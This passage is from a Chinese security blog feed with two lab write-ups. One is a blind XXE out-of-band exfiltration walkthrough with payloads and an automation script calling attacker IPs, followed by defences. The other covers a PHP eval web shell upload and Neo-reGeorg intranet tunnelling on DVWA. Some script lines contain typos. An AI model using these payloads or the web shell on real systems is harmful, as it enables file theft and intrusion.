2. 添加 error_reporting (0);&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/4MWYk19N4ue27klM.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;同样再次尝试注入，发现不会返回任何信息&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/DG0D0T2Xqy2zoHPH.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;对于无回显的 XXE，需要构建一条带外数据（Out-of&lt;br&gt;
Band，OOB）通道来读取数据，思路如下：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1.攻击者先发送payload1给Web服务器&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2.payload1触发web服务器，web服务器向vps获取恶意DTD，并执行payload2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3.payload2使web服务器把结果作为参数来访问vps上的HTTP服务&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4.攻击者通过vps的HTTP访问记录得到结果&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;攻击过程图如下：&lt;br&gt;
&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/6Pzd8oTxfjqAPOBC.png!thumbnail&#34; alt=&#34;&#34; title=&#34;fig:&#34;&gt;&lt;/p&gt;
&lt;p&gt;首先在 vps 上创建名为 evil.xml 的恶意 DTD 文件，并将其放在 apache 的网页目录下，同时开启 apache 服务&lt;/p&gt;
&lt;p&gt;payload1：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;!DOCTYPE test[&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;!ENTITY % file SYSTEM &amp;quot;php://filter/read=convert.base64-encode/resource=c:/1.txt&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;!ENTITY % remote SYSTEM &amp;quot;http://117.50.184.154/evil.xml&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;%remote;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;%int;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;%send;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;]&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;payload2：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;!ENTITY % payload &amp;quot;&amp;lt;!ENTITY &amp;amp;#x25; send SYSTEM &amp;#x27;http://43.138.160.92/?content=%file;&amp;#x27;&amp;gt;&amp;quot;&amp;gt; %payload;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;根据 payload1 和 payload2，evil.xml 是攻击者存放于 vps 上 apache 的 web 目录下的文件，流程理解为：先发送 payload1 给 web 服务器，其中包括文件的读取操作和引用恶意 DTD 的操作，payload1 作为 xml 文件会被发送至 doLogin 进行解析，但是读取后并没有回显，这时候 remote 引用了恶意的 DTD 文件，进行解析，执行了 payload2，执行 send 指令将回显作为参数发送到 vps 上，并且对 vps 的 http 服务进行了访问，这时候攻击者通过 vps 的 http 的访问记录便可以读取到回显。相当于将回显作为参数进行了一次转发，通过另外的渠道进行了读取&lt;br&gt;
接下来开始复现&lt;/p&gt;
&lt;p&gt;ubuntu 的机子直接用命令安装 apache 服务&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;sudo apt-get install apache2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;访问下公网 ip 确定 apache 服务已经搭建完毕&lt;br&gt;
&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/qcqAu9O76NRWYIjh.png!thumbnail&#34; alt=&#34;&#34; title=&#34;fig:&#34;&gt;&lt;/p&gt;
&lt;p&gt;接着在 /var/www/html 中写入 evil.xml 文件，内容为 payload2，写入成功后 ip/evil.xml 访问文件确认是否能被 payload1 引用到&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/fJqsGAnuGuvLcOjq.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;成功，接下来就是利用环节了&lt;/p&gt;
&lt;p&gt;在 vps 上命令开启访问日志的监控&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;tail -f /var/log/apache2/access.log&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;接着抓包登录界面，使用 payload1 并发送到重发器当中进行发送&lt;br&gt;
&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/DgZpEBzDiFUlWeYq.png!thumbnail&#34; alt=&#34;&#34; title=&#34;fig:&#34;&gt;&lt;/p&gt;
&lt;p&gt;回显 200，发送成功，回 vps 上查看&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/S0Mks2Mk8aY3DIin.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;成功实现转发，由于之前对读取操作的回显进行了 base64 编码，因此该串 base64 编码便是读取文件的内容，进行解码&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/MMGOeCXa0scx5q9e.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;成功读取&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;检测方法&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;在目标服务器无回显情况下，只能通过 OOB 信息传送来进行 XXE 攻击，但实际的操作过程则比较繁琐，针对无回显的 XXE，通过 python 脚本来实现流程自动化&lt;br&gt;
写入脚本相关信息和模块&lt;/p&gt;
&lt;/blockquote&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from http.server import HTTPServer,SimpleHTTPRequestHandler&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import threading&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import requests&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import sys&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;编写攻击 payload 的生成函数，能够根据给定的 IP 地址和端口生成相应的包含恶意 DTD 的 XML 文件：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;def ExportPayload(lip,lport):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    file = open(&amp;#x27;evil.xml&amp;#x27;,&amp;#x27;w&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    file.write(&amp;quot;&amp;lt;!ENTITY % payload \&amp;quot;&amp;lt;!ENTITY &amp;amp;#x25; send SYSTEM &amp;#x27;http://&amp;#123;0&amp;#125;：&amp;#123;1&amp;#125;/?content=%file;&amp;#x27;&amp;gt;\&amp;quot;&amp;gt; %payload;&amp;quot;.format(lip,lport))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    file.close()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    print(&amp;quot;[*] payload文件创建成功！&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;编写 HTTP 服务函数，通过 http.server 模块实现 HTTP 服务，用来监听目标服务器返回的数据：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;# 开启HTTP服务，接收数据&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;def StartHTTP(lip, lport):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    # HTTP监听的IP地址和端口&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    serverAddr = (lip, lport)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    httpd = HTTPServer(serverAddr, MyHandler)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    print(&amp;quot;[*]正在开启HTTP服务器：\n\n================\nIP地址:&amp;#123;0&amp;#125;\n端口：&amp;#123;1&amp;#125;\n==================\n&amp;quot;.format(lip, lport))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    httpd.server_forever()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;编写 POST 发送函数，用来向目标服务器发送攻击数据：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;# 通过POST发送攻击数据&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;def SendData(lip, lport, url):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    # 需要读取的文件路径（默认值）&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    filePath = &amp;quot;c:\\1.txt&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    while True:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        # 对用户输入的文件路径斜杠替换&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        filePath = filePath.replace(&amp;#x27;\\&amp;#x27;, &amp;quot;/&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        data = &amp;quot;&amp;lt;?xml version=\&amp;quot;1.0\&amp;quot;?&amp;gt;\n&amp;lt;?DOCTYPE test[\n&amp;lt;!ENtity  % file SYSTEM &amp;quot; \&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;               &amp;quot;\&amp;quot;php://filter/read=convert.base64-encode/resource=&amp;#123;0&amp;#125;\&amp;quot;&amp;gt;\n&amp;lt;!ENTUTY % remote SYSTEM \&amp;quot;http://&amp;#123;1&amp;#125;:&amp;#123;&amp;quot; \&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;               &amp;quot;2&amp;#125;/evil.xml\&amp;quot;&amp;gt;\n%remote;\n%int;\n%send;\n]&amp;gt;&amp;quot;.format( &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            filePath, lip, lport)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        requests.post(url, data=data)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        # 继续接收用户的输入，读取指定文件&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        filePath = input(&amp;quot;Input filePath:&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;定义一个消息处理类，这个类继承自 SimpleHTTPRequestHandler。同时需要对原生的日志消息函数进行重写，使其在输出访问信息的同时，把访问的信息记录到文件中去（该函数位于 BaseHTTPServer.py 中）：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;# 对原生的log_message函数进行重写，在输出结果的同时把结果保存到文件中&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;class MyHandler(SimpleHTTPRequestHandler):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    def log_message(self, format, *args):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        # 终端输出HTTP访问信息&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        sys.stderr.write(&amp;quot;%s - - [%s] %s\n&amp;quot; % (self.client_address[0], self.log_data_time_string(), format % args))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        # 保存信息到文件&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        textFile = open(&amp;quot;result.txt&amp;quot;, &amp;quot;a&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        textFile.write(&amp;quot;%s - - [%s] %s\n&amp;quot; % (&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        self.client_address[0], self.client_address[0], self.log_data_time_string(), format % args))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        textFile.close()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;编写主函数，在其中进行相关变量的定义以及函数的调用&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;if __name__ == &amp;#x27;__main__&amp;#x27;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    # 本机IP&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    lip = &amp;quot;IP&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    # 本机HTTP监听端口&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    lport = port&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    # 目标网站提交表单的URL&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    url = &amp;quot;http://IP/xxe-lab/php_xxe/doLogin.php&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    # 创建payload文件&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    ExportPayload(lip, lport)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    # HTTP服务线程&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    threadHTTP = threading.Thread(target=StartHTTP, args=(lip, lport))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    threadHTTP.start()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    # 发送POST数据线程&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    threadPOST = threading.Thread(target=SendData, args=(lip, lport，url))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    threadPOST.start()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;防御策略&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;XXE 的危害不仅在于攻击服务器，还能通过 XXE 进行内网的端口探测以及攻击内网网站等&lt;br&gt;
防御方式：&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;1. 默认禁止外部实体的解析&lt;/p&gt;
&lt;p&gt;2. 对用户提交的 XML 数据进行过滤，如关键词 &amp;lt;!DOCTYPE 和 &amp;lt;!ENTITY 或者 SYSTEM 和 PUBLIC 等&lt;/p&gt;
</content>
        <category term="其它" />
        <updated>2024-04-16T05:58:19.054Z</updated>
    </entry>
    <entry>
        <id>https://nnnpc.github.io/2024/04/16/%E6%B5%85%E6%9E%90%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E7%9A%84%E6%90%AD%E5%BB%BA/</id>
        <title>浅析内网代理的搭建</title>
        <link rel="alternate" href="https://nnnpc.github.io/2024/04/16/%E6%B5%85%E6%9E%90%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E7%9A%84%E6%90%AD%E5%BB%BA/"/>
        <content type="html">&lt;p&gt;工具：Neo-reGeorg&lt;/p&gt;
&lt;p&gt;这段时间打了一个渗透赛，也是通过这次机会向独奏师傅学习到了好多东西&lt;/p&gt;
&lt;p&gt;在这里先简单记录一下&lt;/p&gt;
&lt;p&gt;首先内网代理搭建就是为了让内网能够被自己的机子正常访问服务&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/306zpHzXyILqO3mf.jpg!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;这里附上一副图，cms-phpok 便是代表的使外网的机子，而后面的 solr 代表的便是内网的机子，在外网没有 getshell，没有搭建代理，是无法正常访问内网的机子的，因此在这里记录一下 getshell 之后搭建内网代理的过程&lt;/p&gt;
&lt;p&gt;首先先拿到一台有 web 服务的服务器，这里简单一些就直接拿一台部署过 dvwa 靶场的服务器来做示例了&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/IZ4Jr7evru8QPAQ4.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;首先先正常登录，找到上传点，上传一句话木马&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?= @eval($_POST&amp;#123;&amp;#x27;a&amp;#x27;&amp;#125;);?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/cVoUo74iMEloeN0B.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;使用蚁剑 getshell&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/8QMV9I5CChjCcZG0.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;然后我们能在根目录看到有个 tmp 目录，有个小 tips 就是可以在这里上传扫描工具，比如 fscan 什么的，就能实现在它的机子上扫描内网 ip 了&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/Pb4lRT2DAFnAOhBF.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;我这里上传了一个 fscan 作为示例，内网地址的话本次的比赛是给了，但是也可以自己找，一种方法就是在虚拟终端 ip&lt;br&gt;
addr 查看&lt;/p&gt;
&lt;p&gt;还有一种方法以这台机子为例&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/QczlTQbb1iudJYdV.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;进入根目录下发现使用 docker 搭建的，那么直接 cat&lt;br&gt;
/etc/hosts，也能够找到内网的 ip&lt;/p&gt;
&lt;p&gt;这里就不展示了，接下来讲述内网代理的搭建工具 Neo-reGeorg&lt;/p&gt;
&lt;p&gt;首先在原先上传马的目录先上传工具 Neo-reGeorg\neoreg_servers 目录下的 tunnel.php，接着打开自己的终端运行 python 工具脚本&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;python3 neoreg.py -k key -u ip/目录/tunnel.php&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;-k 代表的是 key，可以去 Neo-reGeorg\neoreg_servers 目录下的 key.txt 查看&lt;br&gt;
&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/7zlxNRpWUs98OOEk.png!thumbnail&#34; alt=&#34;&#34; title=&#34;fig:&#34;&gt;&lt;/p&gt;
&lt;p&gt;接着在自己的浏览器使用 SwitchyOmega 使用 SOCKS5 协议&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/q8JFmBf9ygpojSpH.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
